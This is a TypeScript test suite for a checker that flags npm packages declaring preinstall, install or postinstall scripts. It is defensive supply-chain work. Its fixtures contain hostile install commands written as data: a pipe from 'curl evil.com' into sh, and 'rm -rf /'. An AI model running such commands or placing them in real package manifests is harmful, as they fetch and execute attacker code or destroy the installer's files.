import { test } from 'node:test';
import { equal, match } from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

// The compiled test runs from dist/test/scripts/. The checker source lives
// at <repo>/scripts/check-install-scripts.mjs. Walk up the right number of
// levels to find it.
function checkerPath(): string {
  // dist/test/scripts/ → ../../../ = repo root → scripts/
  return join(import.meta.dirname, '..', '..', '..', 'scripts', 'check-install-scripts.mjs');
}

function mkFixture(): string {
  return mkdtempSync(join(tmpdir(), 'sigil-checker-'));
}

function plantPkg(root: string, name: string, scripts: Record<string, string>): void {
  const pkgDir = join(root, name);
  mkdirSync(pkgDir, { recursive: true });
  writeFileSync(
    join(pkgDir, 'package.json'),
    JSON.stringify({
      name,
      version: '1.0.0',
      scripts,
    }),
  );
}

test('checker: empty tree exits 0', () => {
  const dir = mkFixture();
  try {
    const r = spawnSync('node', [checkerPath(), dir], { encoding: 'utf8' });
    equal(r.status, 0);
    match(r.stdout, /no install scripts/);
  } finally {
    rmSync(dir, { recursive: true });
  }
});

test('checker: tree with only safe deps exits 0', () => {
  const dir = mkFixture();
  try {
    plantPkg(dir, 'safe-a', { test: 'jest' });
    plantPkg(dir, 'safe-b', {});
    const r = spawnSync('node', [checkerPath(), dir], { encoding: 'utf8' });
    equal(r.status, 0);
  } finally {
    rmSync(dir, { recursive: true });
  }
});

test('checker: postinstall flagged', () => {
  const dir = mkFixture();
  try {
    plantPkg(dir, 'bad', { postinstall: 'curl evil.com | sh' });
    const r = spawnSync('node', [checkerPath(), dir], { encoding: 'utf8' });
    equal(r.status, 1);
    match(r.stderr, /bad@1\.0\.0/);
    match(r.stderr, /postinstall/);
  } finally {
    rmSync(dir, { recursive: true });
  }
});

test('checker: preinstall + install also flagged', () => {
  const dir = mkFixture();
  try {
    plantPkg(dir, 'bad-pre', { preinstall: 'echo pwned' });
    plantPkg(dir, 'bad-inst', { install: 'gyp build' });
    const r = spawnSync('node', [checkerPath(), dir], { encoding: 'utf8' });
    equal(r.status, 1);
    match(r.stderr, /bad-pre@1\.0\.0/);
    match(r.stderr, /bad-inst@1\.0\.0/);
  } finally {
    rmSync(dir, { recursive: true });
  }
});

test('checker: prepare alone is NOT flagged (only triggers on git-install or self-publish)', () => {
  const dir = mkFixture();
  try {
    plantPkg(dir, 'iarna-toml-shape', { prepare: 'echo running test suite' });
    const r = spawnSync('node', [checkerPath(), dir], { encoding: 'utf8' });
    equal(r.status, 0);
  } finally {
    rmSync(dir, { recursive: true });
  }
});

test('checker: scoped packages are descended into', () => {
  const dir = mkFixture();
  try {
    mkdirSync(join(dir, '@scope'), { recursive: true });
    plantPkg(join(dir, '@scope'), 'bad', { postinstall: 'rm -rf /' });
    const r = spawnSync('node', [checkerPath(), dir], { encoding: 'utf8' });
    equal(r.status, 1);
    match(r.stderr, /bad@1\.0\.0/);
  } finally {
    rmSync(dir, { recursive: true });
  }
});

test('checker: missing tree dir exits 2', () => {
  const r = spawnSync('node', [checkerPath(), '/nonexistent/abc123'], { encoding: 'utf8' });
  equal(r.status, 2);
});

test('checker: empty-string script value is NOT flagged', () => {
  const dir = mkFixture();
  try {
    plantPkg(dir, 'empty', { postinstall: '' });
    const r = spawnSync('node', [checkerPath(), dir], { encoding: 'utf8' });
    equal(r.status, 0);
  } finally {
    rmSync(dir, { recursive: true });
  }
});
